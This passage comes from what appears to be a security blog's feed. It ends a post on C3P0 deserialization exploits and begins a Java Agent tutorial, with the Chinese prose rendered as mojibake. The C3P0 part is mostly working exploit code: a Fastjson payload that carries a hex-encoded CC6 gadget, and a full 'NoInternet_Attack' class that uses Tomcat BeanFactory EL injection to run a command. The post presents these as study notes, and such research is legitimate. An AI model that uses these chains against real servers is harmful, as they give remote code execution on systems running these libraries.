class="hljs-variable">len</span> <span class="hljs-operator">=</span> bytes.length;<br>        <span class="hljs-type">StringWriter</span> <span class="hljs-variable">sw</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringWriter</span>(len * <span class="hljs-number">2</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; len; ++i)<br>            addHexAscii(bytes[i], sw);<br>        <span class="hljs-keyword">return</span> sw.toString();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, PropertyVetoException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">hex</span> <span class="hljs-operator">=</span> toHexAscii(tobyteArray(CC6()));<span class="hljs-comment">//è·å–åå…­è¿›åˆ¶å­—ç¬¦ä¸²</span><br>        System.out.println(hex);<br><br>        <span class="hljs-comment">//Fastjson&lt;1.2.47</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;1\&quot;:&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;val\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;,&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;2\&quot;:&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;,&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;userOverridesAsString\&quot;:\&quot;HexAsciiSerializedMap:&quot;</span>+ hex + <span class="hljs-string">&quot;;\&quot;,&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241103225728831.png" alt="image-20241103225728831"></p><p>ä½ç‰ˆæœ¬fastjsonä¹Ÿå¯ä»¥ç›´æ¥ç”¨ç®€å•ä¸€ç‚¹çš„payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">String payload = &quot;&#123;&quot; +<br>        &quot;\&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;,&quot; +<br>        &quot;\&quot;userOverridesAsString\&quot;:\&quot;HexAsciiSerializedMap:&quot;+ hex + &quot;;\&quot;,&quot; +<br>        &quot;&#125;&quot;;<br></code></pre></td></tr></table></figure><p><strong>ç‰¹æ®Šçš„åœ°æ–¹</strong></p><p>ä½†æ ¹æ®ä¸Šé¢çš„åˆ©ç”¨æµç¨‹æ¥çœ‹ï¼Œå¦‚æœé…åˆfastjsonçš„é“¾å­ï¼Œè¿™é‡Œæˆ‘ä»¬çš„WrapperConnectionPoolDataSourceç±»è‡³å°‘éœ€è¦è°ƒç”¨ä¸¤æ¬¡æ„é€ æ–¹æ³•ï¼Œç¬¬ä¸€ä¸ªæ¬¡æ˜¯è°ƒç”¨æˆ‘ä»¬çš„setteræ–¹æ³•ï¼Œç¬¬äºŒæ¬¡æ˜¯è°ƒç”¨æ„é€ æ–¹æ³•è§¦å‘é“¾å­</p><p>å…³é”®çš„åœ°æ–¹å°±åœ¨ä»–çš„setUserOverridesAsStringæ–¹æ³•é‡Œé¢ï¼Œæˆ‘ä»¬å»çœ‹ä¸€ä¸‹</p><p><img src="https://cdn.clown2024.cn/image-20241103235801196.png" alt="image-20241103235801196"></p><p>å½“æˆ‘ä»¬è°ƒç”¨è¯¥setteræ—¶ï¼Œé¦–å…ˆä¼šä¸æ—§çš„<code>userOverridesAsString</code>å±æ€§æ¯”è¾ƒï¼Œè¿™é‡Œæ—§å€¼ä¸º<code>null</code>ï¼Œæ–°å€¼ä¸ºæˆ‘ä»¬æ„é€ çš„<code>userOverridesAsString</code>ï¼Œå› æ­¤è¿™é‡Œä¼šè¿›å…¥ifåˆ¤æ–­ã€‚</p><p>ä¸€è·¯è·Ÿè¿›æ–¹æ³•ï¼Œæœ€ç»ˆåˆ°<code>WrapperConnectionPoolDataSource#vetoableChange</code>æ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241104000506391.png" alt="image-20241104000506391"></p><p>è¿™é‡ŒpropNameå°±æ˜¯userOverridesAsStringï¼Œæˆ‘ä»¬ä¼šèµ°åˆ°è¿™ä¸ªåˆ¤æ–­é‡Œé¢ï¼Œç„¶åç›´æ¥è°ƒç”¨C3P0ImplUtils#parseUserOverridesAsStringæ–¹æ³•å¯¹æˆ‘ä»¬ä¼ å…¥çš„åå…­è¿›åˆ¶å­—ç¬¦ä¸²è¿›è¡Œè§£æï¼Œå°±å‡å°‘äº†ä¸€æ¬¡éœ€è¦è°ƒç”¨æ„é€ å‡½æ•°çš„æ“ä½œ</p><h1 id="c3p0ä¸å‡ºç½‘åˆ©ç”¨"><a href="#C3P0ä¸å‡ºç½‘åˆ©ç”¨" class="headerlink" title="C3P0ä¸å‡ºç½‘åˆ©ç”¨"></a>C3P0ä¸å‡ºç½‘åˆ©ç”¨</h1><p>C3P0ä¸å‡ºç½‘çš„åˆ©ç”¨æ¡ä»¶è¾ƒä¸ºè‹›åˆ»ï¼Œè€Œä¸”éœ€è¦å­˜åœ¨Tomcat8çš„ä¾èµ–ç¯å¢ƒ</p><p>è·Ÿjndié«˜ç‰ˆæœ¬ç»•è¿‡ç±»ä¼¼ï¼Œä½†æ˜¯jndié«˜ç‰ˆæœ¬ç»•è¿‡è¿˜æ²¡å­¦ï¼Œä½“ä¼šä¸åˆ°ï¼Œæ‰€ä»¥å…ˆç©ºä¸€ä¸‹åˆ°æ—¶å†è¡¥ğŸ«¡</p><p>åäºŒæœˆä»½æœ‰æœºä¼šæ¥è¡¥ä¸€ä¸‹äº†ğŸ«¡</p><p>jdniçš„é«˜ç‰ˆæœ¬ç»•è¿‡ä¸­ï¼Œæˆ‘ä»¬çŸ¥é“æœ‰ä¸€ç§æ–¹å¼å°±æ˜¯åˆ©ç”¨Tomcatçš„BeanFactoryçš„getObjectInstaceæ–¹æ³•ï¼Œæ¥è¿›è¡ŒELè¡¨è¾¾å¼çš„æ³¨å…¥</p><p>å›å¤´çœ‹å‰é¢è¿œç¨‹ç±»åŠ è½½ä¸­çš„ReferenceableUtils#referenceToObjectæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241203204529365.png" alt="image-20241203204529365"></p><p>æ¬¸å¯ä»¥å‘ç°ï¼Œè¿™é‡Œå®Œç¾çš„ç¬¦åˆjndié«˜ç‰ˆæœ¬ç»•è¿‡çš„æ–¹å¼ï¼Œåªè¦å°†è¿™ä¸ªFactoryè®¾ç½®ä¸ºBeanFactoryå³å¯ï¼Œç„¶åå°±å¯ä»¥åœ¨ä¸å‡ºç½‘çš„æƒ…å†µä¸‹è¿›è¡Œjndiæ³¨å…¥äº†</p><p>å…ˆå¯¼å…¥ä¸‹é¢ä¸‰ä¸ªç±»æ–¹ä¾¿åˆ©ç”¨æµ‹è¯•</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"> <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-catalina<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.5.55<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-el-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.5.55<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-jasper-el<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.5.55<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="åˆ©ç”¨é“¾æ„é€ "><a href="#åˆ©ç”¨é“¾æ„é€ -3" class="headerlink" title="åˆ©ç”¨é“¾æ„é€ "></a>åˆ©ç”¨é“¾æ„é€ </h2><p>æˆ‘ä»¬çŸ¥é“BeanFactoryéœ€è¦ä¼ å…¥ResourceRefç±»ï¼Œæˆ‘ä»¬åœ¨getReferenceæ–¹æ³•ä¸­è¿”å›ResourceRefå³å¯</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.exp;<br><br><span class="hljs-keyword">import</span> com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;<br><span class="hljs-keyword">import</span> org.apache.naming.ResourceRef;<br><br><span class="hljs-keyword">import</span> javax.naming.NamingException;<br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> javax.naming.Referenceable;<br><span class="hljs-keyword">import</span> javax.naming.StringRefAddr;<br><span class="hljs-keyword">import</span> javax.sql.ConnectionPoolDataSource;<br><span class="hljs-keyword">import</span> javax.sql.PooledConnection;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.sql.SQLException;<br><span class="hljs-keyword">import</span> java.sql.SQLFeatureNotSupportedException;<br><span class="hljs-keyword">import</span> java.util.logging.Logger;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">NoInternet_Attack</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EXP_Loader</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ConnectionPoolDataSource</span>, Referenceable &#123;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> Reference <span class="hljs-title function_">getReference</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> NamingException &#123;<br>            <span class="hljs-comment">// å®ä¾‹åŒ–Referenceï¼ŒæŒ‡å®šç›®æ ‡ç±»ä¸ºjavax.el.ELProcessorï¼Œå·¥å‚ç±»ä¸ºorg.apache.naming.factory.BeanFactory</span><br>            <span class="hljs-type">ResourceRef</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResourceRef</span>(<span class="hljs-string">&quot;javax.el.ELProcessor&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-literal">true</span>,<span class="hljs-string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="hljs-literal">null</span>);<br>            <span class="hljs-comment">// å¼ºåˆ¶å°†&#x27;x&#x27;å±æ€§çš„setterä»&#x27;setX&#x27;å˜ä¸º&#x27;eval&#x27;, è¯¦ç»†é€»è¾‘è§BeanFactory.getObjectInstanceä»£ç </span><br>            ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;forceString&quot;</span>, <span class="hljs-string">&quot;x=eval&quot;</span>));<br>            <span class="hljs-comment">// åˆ©ç”¨è¡¨è¾¾å¼æ‰§è¡Œå‘½ä»¤</span><br>            ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;calc&#x27;]).start()\&quot;)&quot;</span>));<br>            <span class="hljs-keyword">return</span> ref;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> PooledConnection <span class="hljs-title function_">getPooledConnection</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> PooledConnection <span class="hljs-title function_">getPooledConnection</span><span class="hljs-params">(String user, String password)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> PrintWriter <span class="hljs-title function_">getLogWriter</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setLogWriter</span><span class="hljs-params">(PrintWriter out)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br><br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setLoginTimeout</span><span class="hljs-params">(<span class="hljs-type">int</span> seconds)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br><br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getLoginTimeout</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> Logger <span class="hljs-title function_">getParentLogger</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLFeatureNotSupportedException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">//åºåˆ—åŒ–</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Pool_Serial</span><span class="hljs-params">(ConnectionPoolDataSource c)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException &#123;<br>        <span class="hljs-comment">//åå°„ä¿®æ”¹connectionPoolDataSourceå±æ€§å€¼ä¸ºæˆ‘ä»¬çš„æ¶æ„ConnectionPoolDataSourceç±»</span><br>        <span class="hljs-type">PoolBackedDataSourceBase</span> <span class="hljs-variable">poolBackedDataSourceBase</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PoolBackedDataSourceBase</span>(<span class="hljs-literal">false</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">cls</span> <span class="hljs-operator">=</span> poolBackedDataSourceBase.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> cls.getDeclaredField(<span class="hljs-string">&quot;connectionPoolDataSource&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(poolBackedDataSourceBase,c);<br><br>        <span class="hljs-comment">//åºåˆ—åŒ–æµå†™å…¥æ–‡ä»¶</span><br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;exp.bin&quot;</span>));<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(fos);<br>        oos.writeObject(poolBackedDataSourceBase);<br><br>    &#125;<br><br>    <span class="hljs-comment">//ååºåˆ—åŒ–</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Pool_Deserial</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;exp.bin&quot;</span>));<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(fis);<br>        objectInputStream.readObject();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;<br>        <span class="hljs-type">EXP_Loader</span> <span class="hljs-variable">exp_loader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EXP_Loader</span>();<br>        Pool_Serial(exp_loader);<br>        Pool_Deserial();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241203210853776.png" alt="image-20241203210853776"></p><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://goodapple.top/archives/1749">https://goodapple.top/archives/1749</a></p><p><a href="https://forum.butian.net/share/2868">https://forum.butian.net/share/2868</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;c3p0ä»‹ç»&quot;&gt;&lt;a href=&quot;#C3P0ä»‹ç»&quot; class=&quot;headerlink&quot; title=&quot;C3P0ä»‹ç»&quot;&gt;&lt;/a&gt;C3P0ä»‹ç»&lt;/h1&gt;&lt;p&gt;C3P0æ˜¯ä¸€ä¸ªå¼€æºçš„JDBCè¿æ¥æ± ï¼Œå®ƒå®ç°äº†æ•°æ®æºå’ŒJNDIç»‘å®šï¼Œæ”¯æŒJDBC3è§„èŒƒå’ŒJDBC2çš„æ ‡å‡†æ‰©å±•ã€‚</summary>
      
    
    
    
    <category term="java" scheme="https://clowsman.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>Java Agentå­¦ä¹ </title>
    <link href="https://clowsman.github.io/2024/10/30/Java-Agent%E5%AD%A6%E4%B9%A0/"/>
    <id>https://clowsman.github.io/2024/10/30/Java-Agent%E5%AD%A6%E4%B9%A0/</id>
    <published>2024-10-30T12:41:16.000Z</published>
    <updated>2024-11-13T03:04:14.817Z</updated>
    
    <content type="html"><![CDATA[<h1 id="java-agentä»‹ç»"><a href="#Java-Agentä»‹ç»" class="headerlink" title="Java Agentä»‹ç»"></a>Java Agentä»‹ç»</h1><p>å®˜æ–¹æ–‡æ¡£ï¼š<a href="https://docs.oracle.com/javase/10/docs/api/java/lang/instrument/package-summary.html">https://docs.oracle.com/javase/10/docs/api/java/lang/instrument/package-summary.html</a></p><p>java agentå°±æ˜¯ä¸€ç§èƒ½å¤Ÿåœ¨ä¸å½±å“æ­£å¸¸ç¼–è¯‘çš„æƒ…å†µä¸‹ï¼Œä¿®æ”¹javaå­—èŠ‚ç ï¼Œè¿›è€ŒåŠ¨æ€åœ°ä¿®æ”¹å·²åŠ è½½æˆ–æœªåŠ è½½çš„ç±»ã€å±æ€§å’Œæ–¹æ³•çš„æŠ€æœ¯ã€‚ä¹Ÿå°±æ˜¯å¹³æ—¶æ‰€è¯´çš„æ’æ¡©æŠ€æœ¯ï¼Œå¹³å¸¸çš„çƒ­éƒ¨ç½²ã€è¯Šæ–­å·¥å…·éƒ½æ˜¯åŸºäºJava AgentæŠ€æœ¯æ¥å®ç°çš„ã€‚è¯¥æŠ€æœ¯ä»JDK1.5å¼€å§‹å¼•å…¥ã€‚</p><h1 id="java-agentä½¿ç”¨"><a href="#Java-Agentä½¿ç”¨" class="headerlink" title="Java Agentä½¿ç”¨"></a>Java Agentä½¿ç”¨</h1><p>Java Agentåˆ†ä¸ºä¸¤ç§ï¼Œä¸€ç§æ˜¯åœ¨JVMå¯åŠ¨å‰åŠ è½½çš„premain-Agentï¼Œå¦ä¸€ç§æ˜¯JVMå¯åŠ¨ååŠ è½½çš„agentmain-Agentï¼Œæœ‰ç‚¹ç±»ä¼¼ç‰¹æ®Šçš„æ‹¦æˆªå™¨çš„æ ·å­ã€‚</p><h2 id="premain-agent"><a href="#premain-Agent" class="headerlink" title="premain-Agent"></a>premain-Agent</h2><p>å®ç°è¯¥Agenté¦–å…ˆæˆ‘ä»¬å¿…é¡»å®ç°ä¸€ä¸ªé™æ€premainæ–¹æ³•ï¼ŒåŒæ—¶æˆ‘ä»¬jaræ–‡ä»¶çš„æ¸…å•(mainfest)ä¸­å¿…é¡»è¦æœ‰Premain-Classå±æ€§ï¼Œä¹Ÿå°±æ˜¯jaråŒ…ä¸­å¸¸è§åˆ°çš„MFæ–‡ä»¶ï¼Œè¿™ä»å®˜æ–¹æ–‡æ¡£ä¸­å¯ä»¥å¾—çŸ¥</p><p><img src="https://cdn.clown2024.cn/image-20241030211341318.png" alt="image-20241030211341318"></p><p>å¯ä»¥çŸ¥é“ï¼Œå°±æ˜¯åœ¨æ‰§è¡Œmainæ–¹æ³•å‰æ‰§è¡Œæˆ‘ä»¬çš„premainæ–¹æ³•ï¼Œæ‰§è¡Œçš„ç±»å°±æ˜¯æˆ‘ä»¬Premain-Classå±æ€§çš„å€¼</p><p>ç°åœ¨æ¥å®ç°ä¸€ä¸ªç®€å•çš„premain-Agentï¼Œå…ˆæ­£å¸¸mavenåˆ›å»ºä¸€ä¸ªæ™®é€šçš„é¡¹ç›®</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.Agent;<br><br><span class="hljs-keyword">import</span> java.lang.instrument.Instrumentation;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">premainAgent</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">premain</span><span class="hljs-params">(String agentArgs, Instrumentation inst)</span> &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">10</span>;i++)&#123;<br>            System.out.printf(<span class="hljs-string">&quot;è°ƒç”¨äº†JavaAgent%dæ¬¡\n&quot;</span>,i);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ¥ç€åœ¨ <code>resources/META-INF/</code> ä¸‹åˆ›å»º <code>MANIFEST.MF</code> æ¸…å•æ–‡ä»¶ç”¨ä»¥æŒ‡å®š <code>premain-Agent</code> çš„å¯åŠ¨ç±»</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs MF">Manifest-Version: 1.0<br>Premain-Class: org.example.Agent.premainAgent<br><br></code></pre></td></tr></table></figure><blockquote><p>è¦æ³¨æ„è¯¥æ–‡ä»¶æœ€åä¸€å®šè¦å¤šä¸€ä¸ªæ¢è¡Œï¼Œä¸ç„¶ä¼šçˆ†çº¢</p></blockquote><p>ç›®å‰çš„ç›®å½•ç»“æ„å¦‚ä¸‹ï¼š</p><p><img src="https://cdn.clown2024.cn/image-20241030213350306.png" alt="image-20241030213350306"></p><p>ç„¶åæˆ‘ä»¬å°†è¯¥æ–‡ä»¶æ‰“æˆjaråŒ…ï¼Œè¿™é‡Œè®°å½•ä¸¤ç§æ‰“åŒ…æ–¹å¼</p><p><strong>ç”¨jarå‘½ä»¤æ‰“åŒ…</strong></p><p>æ‰“åŒ…å‰æˆ‘ä»¬éœ€è¦å°†javaæ–‡ä»¶æ›¿æ¢æˆæˆ‘ä»¬ç¼–è¯‘å¥½çš„classæ–‡ä»¶ï¼Œå› ä¸ºjarå‘½ä»¤å°±åªæ˜¯å°†æ–‡ä»¶æ‰“åŒ…æˆä¸€ä¸ªjarï¼Œå¹¶ä¸ä¼šè¿›è¡Œç¼–è¯‘ï¼Œè€ŒjaråŒ…çš„æ–‡ä»¶æƒ³è¦è¢«JVMè¯†åˆ«å°±éœ€è¦æ˜¯classæ–‡ä»¶</p><p>ç„¶åå¯¹srcç›®å½•çš„æ‰€æœ‰æ–‡ä»¶æ‰“åŒ…</p><figure class="highlight cmd"><table><tr><td class="code"><pre><code class="hljs cmd"><span class="hljs-function">D:\<span class="hljs-title">CTF</span>\<span class="hljs-title">Java</span>\<span class="hljs-title">JavaCode</span>\<span class="hljs-title">JavaAgent</span>\<span class="hljs-title">src</span>\<span class="hljs-title">main</span>&gt;<span class="hljs-title">jar</span> <span class="hljs-title">cvfm</span> ..\..\<span class="hljs-title">agent.jar</span> <span class="hljs-title">resources</span>/<span class="hljs-title">META</span>-<span class="hljs-title">INF</span>/<span class="hljs-title">MANIFEST.MF</span> ..\..\<span class="hljs-title">src</span></span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241030220310229.png" alt="image-20241030220310229"></p><p><img src="https://cdn.clown2024.cn/image-20241030220348113.png" alt="image-20241030220348113"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">å‚æ•°è¯´æ˜ï¼š<br>cï¼šåˆ›å»ºæ–°çš„ JAR æ–‡ä»¶ã€‚<br>vï¼šç”Ÿæˆè¯¦ç»†è¾“å‡ºï¼Œä»¥ä¾¿æŸ¥çœ‹æ­£åœ¨æ‰§è¡Œçš„æ“ä½œã€‚<br>fï¼šæŒ‡å®š JAR æ–‡ä»¶çš„åç§°ã€‚<br>mï¼šæŒ‡å®š MANIFEST.MF æ–‡ä»¶çš„ä½ç½®ã€‚<br></code></pre></td></tr></table></figure><p>ç„¶åå°±èƒ½çœ‹åˆ°æˆ‘ä»¬çš„agent.jaråŒ…äº†ï¼Œæˆ‘çœ‹æ–‡ç« ä¹Ÿå¯ä»¥ç›´æ¥æŒ‡å®šå•ä¸€classæ–‡ä»¶æ‰“æˆjaråŒ…ï¼Œä¾‹å¦‚è¿™æ ·</p><figure class="highlight cmd"><table><tr><td class="code"><pre><code class="hljs cmd">jar cvfm ..\..\agent1.jar resources/META-INF/MANIFEST.MF java\org\example\Agent\<br>premainAgent.class<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241030220652347.png" alt="image-20241030220652347"></p><p>è¿™ç§æ‰“åŒ…æ–¹å¼ä¼šè‡ªåŠ¨ç»™ä½ åˆ›å»ºå¿…è¦çš„åŒ…è·¯å¾„ï¼Œå¯¹æ¯”äº†ä¸€ä¸‹ä¸¤ç§æ‰“åŒ…æ–¹å¼ï¼Œç›®å½•ç»“æ„å¦‚ä¸‹</p><p><img src="https://cdn.clown2024.cn/image-20241030220817921.png" alt="image-20241030220817921"></p><p>æŒ‡å®šclassæ–‡ä»¶æ‰“åŒ…çš„å°±æ˜¯ç›´æ¥ä»javaåŒ…å¼€å§‹åˆ›å»ºï¼Œåªåˆ›å»ºå¯»æ‰¾ç±»çš„å¿…è¦çš„åŒ…</p><p><img src="https://cdn.clown2024.cn/image-20241030220900229.png" alt="image-20241030220900229"></p><p>è€ŒæŒ‡å®šç›®å½•çš„æ–¹å¼å°±ä¼šä»æˆ‘ä»¬æŒ‡å®šçš„ç›®å½•å¼€å§‹æ‰“åŒ…ï¼Œéƒ½ä¼šåŒ…æ‹¬è¿›å»</p><p>é¡ºä¾¿ä¹Ÿè®°å½•ä¸€ä¸‹æœ‰å…³jarä¼šç”¨çš„ä¸Šçš„å…¶ä»–å‘½ä»¤ï¼š</p><ul><li><p>æ£€æŸ¥jaræ–‡ä»¶å†…å®¹ï¼šjar tvf agent.jar</p><p><img src="https://cdn.clown2024.cn/image-20241030221232096.png" 